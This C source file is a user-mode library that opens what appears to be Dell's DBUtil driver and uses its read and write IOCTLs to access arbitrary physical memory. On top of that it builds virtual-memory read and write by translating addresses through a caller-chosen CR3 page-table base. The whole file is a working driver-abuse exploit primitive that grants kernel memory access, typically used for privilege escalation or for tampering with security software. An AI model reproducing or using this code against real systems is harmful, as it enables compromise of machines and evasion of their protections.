#include "flash64.h"
#include "paging.h"

// Private struct, only for use by Flash namespace.
// External functions should only use the generic handle returned by FlashOpenDriver.
typedef struct _FLASH_DRIVER_CONTEXT
{
	UINT32    m_hdr;
	HANDLE    m_device;
	ULONGLONG m_cr3;
} FLASH_DRIVER_CONTEXT, *PFLASH_DRIVER_CONTEXT;

BOOLEAN
FlashpIsValidContext(
	HANDLE handle
	)
{
	PFLASH_DRIVER_CONTEXT ctx;

	if( handle == INVALID_HANDLE_VALUE || handle == NULL )
		return FALSE;

	ctx = ( PFLASH_DRIVER_CONTEXT )handle;

	if( ctx->m_hdr != FLASH_DRIVER_CONTEXT_MAGIC )
		return FALSE;

	return TRUE;
}

PFLASH_DRIVER_CONTEXT
FlashpCreateContext(
	HANDLE device
	)
{
	PFLASH_DRIVER_CONTEXT ctx;

	ctx = RtAllocateHeapZeroed( sizeof( *ctx ) );
	
	if( ctx != NULL )
	{
		ctx->m_hdr    = FLASH_DRIVER_CONTEXT_MAGIC;
		ctx->m_device = device;
		ctx->m_cr3    = 0;
	}

	return ctx;
}

PFLASH_DRIVER_CONTEXT
FlashpGetContextValidated(
	HANDLE handle
	)
{
	if( FlashpIsValidContext( handle ) == FALSE )
		return NULL;

	return ( PFLASH_DRIVER_CONTEXT ) handle;
}

NTSTATUS
FlashOpenDriver(
	PHANDLE handle_out
	)
{
	NTSTATUS              status;
	OBJECT_ATTRIBUTES     attrib;
	UNICODE_STRING        link;
	IO_STATUS_BLOCK       iosb;
	PFLASH_DRIVER_CONTEXT ctx;
	HANDLE                device;

	if( handle_out == NULL )
		return STATUS_INVALID_PARAMETER;
	
	RtlSecureZeroMemory( &attrib, sizeof( attrib ) );
	RtlSecureZeroMemory( &iosb, sizeof( iosb ) );
	
	RtlInitUnicodeString( &link, DBUTIL_SYMLINK_PATH );
	InitializeObjectAttributes( &attrib, &link, 0, NULL, NULL );

	status = NtCreateFile( &device,
				FILE_READ_ATTRIBUTES | GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
			    &attrib,
			    &iosb,
			    NULL,
			    0,
			    0,
				FILE_OPEN,
			    FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
			    NULL,
			    0 );

	if( NT_SUCCESS( status ) )
	{
		ctx = FlashpCreateContext( device );

		if( !ctx )
		{
			NtClose( device );
			return STATUS_MEMORY_NOT_ALLOCATED;
		}

		*handle_out = ( HANDLE )ctx;
	}

	return status;
}

NTSTATUS
FlashCloseDriver(
	HANDLE driver
	)
{
	PFLASH_DRIVER_CONTEXT ctx;
	HANDLE                device;

	if( !( ctx = FlashpGetContextValidated( driver ) ) )
		return STATUS_INVALID_PARAMETER;

	device = ctx->m_device;

	RtlSecureZeroMemory( ctx, sizeof( *ctx ) );
	RtFreeHeap( ctx );

	return NtClose( device );
}

NTSTATUS
FlashReadWritePhysicalMemory(
	HANDLE driver,
	ULONGLONG pa,
	PVOID out,
	DWORD size,
	BOOLEAN write
	)
{
	PFLASH_DRIVER_CONTEXT    ctx;
	PDELL_PACKET_READWRITEPA packet;
	DWORD                    packet_size;
	IO_STATUS_BLOCK          iosb;
	NTSTATUS                 status;

	if( !( ctx = FlashpGetContextValidated( driver ) ) )
		return STATUS_INVALID_PARAMETER_1;

	RtSetMemory( &iosb, 0, sizeof( IO_STATUS_BLOCK ) );

	packet_size = ( size + sizeof( DELL_PACKET_READWRITEPA ) );
	packet      = RtAllocateHeapZeroed( packet_size );

	packet->m_magic = 0;
	packet->m_pa    = pa;

	if( write )
		RtCopyMemory( packet->m_data, out, size );

	status = NtDeviceIoControlFile( ctx->m_device, NULL, NULL, NULL, &iosb, ( write ? DBUTIL_IOCTL_WRITEPA : DBUTIL_IOCTL_READPA ), packet, packet_size, packet, packet_size );

	if( iosb.Information > packet_size )
		return STATUS_INFO_LENGTH_MISMATCH;

	if( !write )
		RtCopyMemory( out, packet->m_data, size );

	return status;
}

NTSTATUS
FlashReadPhysicalMemory(
	HANDLE driver,
	ULONGLONG pa,
	PVOID out,
	DWORD size
	)
{
	return FlashReadWritePhysicalMemory( driver, pa, out, size, FALSE );
}

NTSTATUS
FlashWritePhysicalMemory(
	HANDLE driver,
	ULONGLONG pa,
	PVOID in,
	DWORD size
	)
{
	return FlashReadWritePhysicalMemory( driver, pa, in, size, TRUE );
}

NTSTATUS
FlashSetUsedCr3Value(
	HANDLE driver,
	ULONGLONG value,
	PULONGLONG optional_old
	)
{
	PFLASH_DRIVER_CONTEXT ctx;

	if( !( ctx = FlashpGetContextValidated( driver ) ) )
		return STATUS_INVALID_PARAMETER;

	if( optional_old != NULL )
		*optional_old = ctx->m_cr3;

	ctx->m_cr3 = value;

	return STATUS_SUCCESS;
}

NTSTATUS
FlashReadVirtualMemory(
	HANDLE driver,
	ULONGLONG va,
	PVOID out,
	DWORD size
	)
{
	PFLASH_DRIVER_CONTEXT ctx;
	NTSTATUS              status;
	ULONGLONG             pa;

	if( !( ctx = FlashpGetContextValidated( driver ) ) )
		return STATUS_INVALID_PARAMETER_1;

	if( !NT_SUCCESS( status = PagingVirtualToPhysical( driver, ctx->m_cr3, va, &pa ) ) )
		return status;

	return FlashReadPhysicalMemory( driver, pa, out, size );
}

NTSTATUS
FlashWriteVirtualMemory(
	HANDLE driver,
	ULONGLONG va,
	PVOID in,
	DWORD size
	)
{
	PFLASH_DRIVER_CONTEXT ctx;
	NTSTATUS              status;
	ULONGLONG             pa;

	if( !( ctx = FlashpGetContextValidated( driver ) ) )
		return STATUS_INVALID_PARAMETER_1;

	if( !NT_SUCCESS( status = PagingVirtualToPhysical( driver, ctx->m_cr3, va, &pa ) ) )
		return status;

	return FlashWritePhysicalMemory( driver, pa, in, size );
}